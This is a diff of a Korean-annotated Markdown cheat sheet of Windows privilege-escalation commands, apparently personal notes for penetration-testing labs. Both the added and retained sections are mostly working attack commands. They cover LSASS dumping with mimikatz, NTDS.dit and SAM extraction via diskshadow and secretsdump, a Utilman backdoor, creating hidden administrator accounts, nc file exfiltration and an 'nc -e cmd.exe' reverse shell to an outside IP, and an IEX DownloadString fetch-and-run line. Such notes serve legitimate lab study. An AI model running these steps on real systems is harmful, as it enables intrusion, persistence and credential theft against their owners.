@@ -130,24 +130,29 @@ sc.exe start usosvc
 </details>
 
 ---
-## use nc to transfer files
+<details>
+ <summary><strong>nc to transfer files</strong></summary>
+
 ```powershell
 nc 10.10.10.10 80 < file.txt
 ```
+ 
+</details>
 
-## findstr
+---
+<details>
+ <summary><strong>findstr</strong></summary>
+
 ```powershelll
 type <file> | findstr /I /N 'NTLM'
 ```
----
-## Winlogon 설정값 조회
-```powershell
-reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
-```
+ 
+</details>
 
 ---
+<details>
+ <summary><strong>PowerShell History</strong></summary>
 
-## PowerShell History
 ```powershell
 $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 $historyPath
@@ -158,27 +163,37 @@ Test-Path $historyPath
 # 히스토리 내용 보기
 Get-Content $historyPath
 ```
+ 
+</details>
 
 ---
+<details>
+ <summary><strong>icacls</strong></summary>
 
-## icacls
 ```powershell
 icacls root.txt /grant alfred:F
 ```
 - root.txt에 alfred에게 Full 권한을 줌
+ 
+</details>
 
 ---
+<details>
+ <summary><strong>파일 검색</strong></summary>
 
-## 파일 검색
+
 ```powershell
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
 
 gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
 ```
+ 
+</details>
 
 ---
+<details>
+ <summary><strong>시스템 정보 수집</strong></summary>
 
-## 시스템 정보 수집
 ```powershell
 Get-LocalUser
 Get-LocalGroup
@@ -221,114 +236,22 @@ Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Ob
 # 파일 접근 권한 확인
 icacls "C:\xampp\apache\bin\httpd.exe"
 ```
+ 
+</details>
 
 ---
+<details>
+ <summary><strong>Scheduled Tasks</strong></summary>
 
-## Service Binary Hijacking
-```powershell
-Get-Service > service.txt
-
-# 실행 중인 서비스만
-Get-Service | Where-Object {$_.Status -eq "Running"} > service.txt
-
-# cmd
-sc query > service.txt
-
-# 서비스 시작/중지
-Start-Service GammaService
-Stop-Service GammaService
-
-sc.exe start GammaService
-sc.exe stop GammaService
-```
-
-### C 코드로 악성 실행 파일 생성
-```c
-#include <stdlib.h>
-
-int main ()
-{
-  int i;
-  
-  i = system ("net user dave2 password123! /add");
-  i = system ("net localgroup administrators dave2 /add");
-  
-  return 0;
-}
-```
-
-```bash
-# 크로스 컴파일
-x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
-```
-
-### 서비스 바이너리 교체
-```powershell
-iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
-
-move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
-move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
-
-net stop mysql
-whoami /priv
-shutdown /r /t 0
-```
-
-### PowerUp.ps1 사용
-```powershell
-iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
-
-powershell -ep bypass
-
-. .\PowerUp.ps1
-
-Get-ModifiableServiceFile
-# 서비스 실행 파일에 일반 사용자 쓰기 권한이 있는 경우를 찾아냄
-# 악성 파일로 서비스 실행 파일을 교체하여 권한 상승 가능
-```
-
----
-
-## Unquoted Service Paths
-
-### 수동 확인
-```powershell
-# 인용부호가 없는 서비스 경로 찾기
-wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
-
-# 서비스 상세 정보 확인
-sc qc VeyonService
-
-# 서비스 시작/중지
-Start-Service GammaService
-Stop-Service GammaService
-
-sc.exe start GammaService
-sc.exe stop GammaService
-
-# 디렉토리 권한 확인
-icacls "C:\Program Files\Enterprise Apps"
-```
-
-### PowerUp.ps1 사용
-```powershell
-Get-UnquotedService
-
-Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
-
-Restart-Service GammaService
-```
-
----
-
-## Scheduled Tasks
 ```powershell
 schtasks /query /fo LIST /v
 ```
+ 
+</details>
 
 ---
-
-## Token Impersonation (SeImpersonatePrivilege)
+<details>
+ <summary><strong>Token Impersonation (SeImpersonatePrivilege)</strong></summary>
 
 ### PrintSpoofer
 ```powershell
@@ -355,9 +278,13 @@ msfvenom -p windows/x64/shell_reverse_tcp -f exe
 
 - https://usersince99.medium.com/windows-privilege-escalation-token-impersonation-seimpersonateprivilege-364b61017070
 
----
+ 
+</details>
 
-## Windows Add User Command
+---
+<details>
+ <summary><strong>Windows Add User Command</strong></summary>
+
 ```powershell
 # 사용자 생성
 net user api Dork123! /add
@@ -366,10 +293,12 @@ net user api Dork123! /add
 net localgroup Administrators api /add
 net localgroup 'Remote Desktop Users' api /add
 ```
+ 
+</details>
 
 ---
-
-## AlwaysInstallElevated
+<details>
+ <summary><strong>AlwaysInstallElevated</strong></summary>
 
 ### 레지스트리 확인
 ```powershell
@@ -389,10 +318,13 @@ msiexec /quiet /qn /i ignite.msi
 ```
 
 - https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
+ 
+</details>
 
 ---
+<details>
+ <summary><strong>SeBackupPrivilege</strong></summary>
 
-## SeBackupPrivilege
 ### base file location
 ```powershell
 C:\windows\system32\SAM
@@ -442,18 +374,24 @@ secretsdump.py -ntds ntds.dit -system system LOCAL
 ```
 
 - https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege
+ 
+</details>
 
 ---
+<details>
+ <summary><strong>PowerUp.ps1</strong></summary>
 
-## PowerUp.ps1 전체 체크
 ```powershell
 . .\PowerUp.ps1
 Invoke-AllChecks
 ```
+ 
+</details>
 
 ---
+<details>
+ <summary><strong>SeRestore</strong></summary>
 
-## SeRestore
 ```powershell
 # C:\Windows\system32
 ren Utilman.exe Utilman.old
@@ -464,10 +402,12 @@ ren cmd.exe Utilman.exe
 rdesktop 192.168.81.165
 # Windows + U 키를 눌러 Utilman 실행 (실제로는 cmd 실행)
 ```
+ 
+</details>
 
 ---
-
-## SeManageVolume
+<details>
+ <summary><strong>SeManageVolume</strong></summary>
 
 ### 방법 1: tzres.dll 교체
 ```bash
@@ -516,10 +456,13 @@ c:\temp\nc.exe <ip> <port> -e cmd.exe
 ```
 
 - https://hackfa.st/Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeManageVolumePrivilege/
+ 
+</details>
 
 ---
+<details>
+ <summary><strong>Server Operators Group</strong></summary>
 
-## Server Operators Group
 ```powershell
 services
 
@@ -535,55 +478,129 @@ sc.exe start VMTools
 ```
 
 - https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/
+ 
+</details>
 
 ---
+<details>
+ <summary><strong>SeDebugPrivilege</strong></summary>
 
-## 참고 자료
-- Privilege Escalation 기법 모음: https://github.com/gtworek/Priv2Admin
+- `Task Manager > Details > choose LSASS > right click > Create dump file`
+```powershell
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+```
+mimikatz.exe
+
+log
+
+sekurlsa::minidump lsass.dmp
+
+sekurlsa::logonpasswords
+```
+
+- `https://github.com/decoder-it/psgetsystem`
+```powershell
+. .\psgetsys.ps1
+
+ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
+```
+ 
+</details>
 
 ---
+<details>
+ <summary><strong>SeTakeOwnershipPrivilege</strong></summary>
 
-## XAMPP 관련
-- `C:\xampp\properties.ini` : xampp 설정파일
+- `https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1`
+```powershell
+Import-Module .\Enable-Privilege.ps1
+
+.\EnableAllTokenPrivs.ps1
+
+Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+
+takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+
+Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+
+icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+```
+ 
+</details>
 
 ---
+<details>
+ <summary><strong>Backup Operators group</strong></summary>
 
-## Windows 재시작
+```
+diskshadow.exe
+
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+```
+```powershell
+Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+
+robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+
+reg save HKLM\SYSTEM system
+
+reg save HKLM\SAM sam
+```
+```powershell
+Import-Module .\DSInternals.psd1
+$key = Get-BootKey -SystemHivePath .\SYSTEM
+Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+```
+```bash
+secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+```
+ 
+</details>
+
+---
+<details>
+ <summary><strong>Windows 재시작</strong></summary>
+
 ```powershell
 shutdown /r /t 0
 ```
+ 
+</details>
 
 ---
+<details>
+ <summary><strong>Windows SSH</strong></summary>
 
-## Windows Download Commands
-```powershell
-certutil -urlcache -f -split <target>
-
-Invoke-WebRequest <target> -OutFile <Path>
-
-curl http://example.com/nc.exe -o nc.exe
-
-# linux의 wget과 다르다 !
-wget http://example.com/file.exe -OutFile file.exe
-```
-
----
-
-## Windows SSH 파일 위치
 ```powershell
 C:\Users\<Username>\.ssh
 ```
+ 
+</details>
 
 ---
+<details>
+ <summary><strong>Path Variables 설정</strong></summary>
 
-## Path Variables 설정
 ```powershell
 set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
 ```
+ 
+</details>
 
 ---
+<details>
+ <summary><strong>PowerShell 명령어 모음</strong></summary>
 
-## PowerShell 명령어 모음
 ```powershell
 IEX(New-Object Net.WebClient).DownloadString("http://ip/file")
 
@@ -591,3 +608,5 @@ Rename-Item -Path <String> -NewName <String>
 
 Remove-Item -Path "C:\Path\To\YourFile.txt"
 ```
+ 
+</details>
